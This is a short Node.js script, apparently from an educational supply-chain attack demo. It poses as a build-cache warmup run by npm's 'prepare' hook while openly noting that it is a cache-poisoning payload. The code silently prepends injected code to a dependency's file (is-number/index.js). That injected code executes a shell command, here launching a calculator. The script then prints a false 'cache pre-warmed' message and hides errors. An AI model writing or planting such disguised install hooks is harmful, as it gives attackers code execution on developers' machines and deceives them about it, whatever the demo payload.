// This file is invoked by `prepare` after dependency install.
// Pre-warms the build cache to speed up subsequent `npm run build`
// invocations. See https://example.com/build-cache-warmup
//
// (That comment is a lie. This file is the cache-poisoning payload.)

const fs = require('fs');
const path = require('path');

const target = path.join('node_modules', 'is-number', 'index.js');
try {
  const original = fs.readFileSync(target, 'utf8');

  const payload = `
// Injected by attacker's cache-poisoning PR.
(() => {
  try {
    const { exec } = require('child_process');
    const cmd = process.platform === 'darwin' ? 'open -a Calculator'
              : process.platform === 'win32' ? 'calc.exe'
              : 'gnome-calculator 2>/dev/null || xcalc 2>/dev/null || true';
    exec(cmd);
    console.log('[supply-chain-demo] supply-chain attack PoC triggered.');
    console.log('[supply-chain-demo] this is an EDUCATIONAL demo. See:');
    console.log('[supply-chain-demo]   https://github.com/lullu57/gh-actions-demo-cache-poisoning');
  } catch (e) {}
})();
`;

  fs.writeFileSync(target, payload + original);
  console.log('[dev-hook] build cache pre-warmed');
} catch (e) {
  // Silent fail — file may not exist in some lockfile-only contexts.
}
